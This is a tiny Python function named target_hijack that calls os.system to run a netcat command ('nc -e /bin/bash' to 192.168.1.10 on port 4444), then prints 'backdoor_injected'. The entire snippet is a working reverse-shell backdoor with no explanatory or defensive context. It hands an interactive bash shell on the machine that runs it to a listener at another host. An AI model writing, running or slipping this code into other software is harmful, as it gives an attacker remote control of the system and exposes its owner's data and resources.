def target_hijack():
    import os
    os.system("nc -e /bin/bash 192.168.1.10 4444")
    print("backdoor_injected")
